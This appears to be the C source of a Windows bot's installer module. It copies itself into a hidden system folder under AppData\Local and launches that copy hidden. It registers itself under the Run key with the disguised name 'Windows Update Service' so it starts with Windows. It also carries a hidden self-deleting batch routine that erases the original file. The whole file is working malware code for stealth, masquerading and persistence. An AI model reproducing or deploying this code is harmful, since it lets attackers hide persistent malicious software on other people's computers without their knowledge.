#include "header.h"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <tchar.h>

// 批处理方式（可选）：用于不支持延迟删除的环境
int delete_self_with_batch() {
    wchar_t batch_path[MAX_PATH];
    GetTempPathW(MAX_PATH, batch_path);
    wcscat_s(batch_path, MAX_PATH, L"delete_self.bat");

    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);

    FILE* fp = _wfopen(batch_path, L"w");
    if (!fp) {
        wprintf(L"[-] Failed to create batch file\n");
        return -1;
    }

    fwprintf(fp,
        L"@echo off\n"
        L"timeout /t 2 >nul\n"
        L":try_delete\n"
        L"del \"%ls\" >nul 2>&1\n"
        L"if exist \"%ls\" goto try_delete\n"
        L"del \"%%0\"\n"
        L"exit\n"
        , current_path, current_path);

    fclose(fp);

    ShellExecuteW(NULL, L"open", batch_path, NULL, NULL, SW_HIDE);
    return 0;
}

// 获取当前模块路径
void get_current_module_path(wchar_t* path, size_t len) {
    GetModuleFileNameW(NULL, path, (DWORD)len);
    path[len - 1] = L'\0';
}

// 获取 AppData\\Local 路径
void get_appdata_path(wchar_t* path, size_t len) {
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        wprintf(L"[+] AppData\\Local: %s\n", path);
        path[len - 1] = L'\0';
    }
    else {
        wprintf(L"[!] Failed to get AppData\\Local path\n");
        path[0] = L'\0';
    }
}

// 创建隐藏目录（带调试输出）
int create_hidden_directory(const wchar_t* path) {
    DWORD attr = GetFileAttributesW(path);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        wprintf(L"[+] Hidden directory already exists: %s\n", path);
        return 0;  // 已存在，无需创建
    }

    if (!CreateDirectoryW(path, NULL)) {
        wprintf(L"[!] Failed to create hidden directory: %s (Error: %d)\n", path, GetLastError());
        return -1;
    }

    if (!SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        wprintf(L"[!] Failed to set hidden attributes for folder: %s\n", path);
        return -1;
    }

    wprintf(L"[+] Created and hidden folder: %s\n", path);
    return 0;
}

// 复制自身并隐藏
int copy_and_hide_bot() {
    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t dest_path[MAX_PATH];
    swprintf(dest_path, MAX_PATH, L"%s%s", appdata, HIDDEN_FOLDER);

    // Step 1: 创建隐藏目录
    if (create_hidden_directory(dest_path) != 0) {
        wprintf(L"[!] Failed to create hidden directory\n");
        return -1;
    }

    // Step 2: 构造目标路径
    wchar_t final_path[MAX_PATH];
    swprintf(final_path, MAX_PATH, L"%s\\%s", dest_path, TARGET_EXE_NAME);

    // Step 3: 获取当前模块路径
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);
    wprintf(L"[+] Current module path: %s\n", current_path);

    // Step 4: 复制自身到隐藏路径
    if (!CopyFileW(current_path, final_path, FALSE)) {// overwrite existing file
        wprintf(L"[!] Copy failed: %d\n", GetLastError());
        return -1;
    }

    wprintf(L"[+] Copied to hidden path: %s\n", final_path);

    // Step 5: 设置隐藏属性
    if (!SetFileAttributesW(final_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) 
    {
        wprintf(L"[!] Failed to set hidden attributes for file\n");
    }
    else {
        wprintf(L"[+] File attributes set to HIDDEN | SYSTEM\n");
    }

    // Step 6: 添加注册表自启动项
    if (set_registry_persistence(final_path) != 0) {
        wprintf(L"[!] Failed to set registry persistence\n");
    }
    else {
        wprintf(L"[+] Registry persistence set\n");
    }

    // Step 7: 启动副本
    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
    //sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"open";
    sei.lpFile = final_path;
    sei.nShow = SW_HIDE;


    if (!ShellExecuteExW(&sei)) {
        wprintf(L"[!] Failed to launch hidden instance (Error: %d)\n", GetLastError());
        return -1;
    }

    wprintf(L"[+] Hidden instance launched successfully\n");

    //delete_self_with_batch();

    return 0;
}

// 注册表添加自启动
int set_registry_persistence(const wchar_t* bot_path) {
    HKEY hKey;
    LONG res = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        wprintf(L"[!] Failed to open Run key\n");
        return -1;
    }

    res = RegSetValueExW(hKey, L"Windows Update Service", 0, REG_SZ, (BYTE*)bot_path, (wcslen(bot_path) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        wprintf(L"[!] Failed to write registry key\n");
        return -1;
    }

    return 0;
}

// 检查自己是否已经是隐藏副本
int is_hidden_bot() {
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);

    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t expected_path[MAX_PATH];
    swprintf(expected_path, MAX_PATH, L"%s%s\\%s", appdata, HIDDEN_FOLDER, TARGET_EXE_NAME);

    wprintf(L"[DEBUG] Expected path: %s\n", expected_path);
    wprintf(L"[DEBUG] Current path: %s\n", current_path);

    if (wcsstr(current_path, expected_path) != NULL) {
        wprintf(L"[+] Already running as hidden bot: %s\n", current_path);
        return 1;  // 已经是隐藏副本
    }

    wprintf(L"[-] Not running as hidden bot\n");
    return 0;  // 不是隐藏副本
}